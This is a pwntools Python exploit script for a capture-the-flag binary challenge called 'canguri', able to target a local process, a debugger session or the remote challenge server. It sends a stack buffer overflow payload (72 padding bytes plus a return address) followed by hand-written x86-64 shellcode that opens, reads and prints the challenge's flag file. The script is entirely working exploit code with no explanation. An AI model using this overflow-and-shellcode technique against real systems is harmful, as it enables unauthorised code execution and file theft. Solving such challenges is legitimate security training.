from pwn import *

context.binary = elf = ELF('./canguri')
context.terminal = ('kgx', '-e')

if args.REMOTE:
    r = remote('kangaroo.challs.olicyber.it', 20005)
elif args.GDB:
    r = gdb.debug('./canguri', '''
                  b *main+593
                  c
                  ''')
else:
    r = process('./canguri')
    
file_name_addr = elf.search(b'/home/problemuser/flag.txt').__next__()
print(f'file_name_addr: {hex(file_name_addr)}')

payload = b'a' * 72 + p64(0x4040C0)

r.sendlineafter(b'?\n', payload)

shellcode = asm(f'''
                mov rdi, {file_name_addr};  # open the file
                mov rsi, 0x0;
                mov rax, 0x2;
                syscall;
                mov rdi, rax;               # read file content
                mov rsi, 0x4040C0;
                mov rdx, 0x20;
                mov al, 0x0;
                syscall;
                mov al, 0x1;                # write to stdout
                mov rdi, 1;
                mov rsi, 0x4040C0;
                mov rdx, 0x20;
                syscall;
                mov al, 0xe7;               # close the file
                syscall;
                ''')

print('shellcode length (in bytes): ', len(shellcode))
r.sendlineafter(b'.\n', shellcode)

r.recvuntil(b'.\n')
r.recvuntil(b'.\n')

print(r.recvuntil(b'}').decode())
r.close()
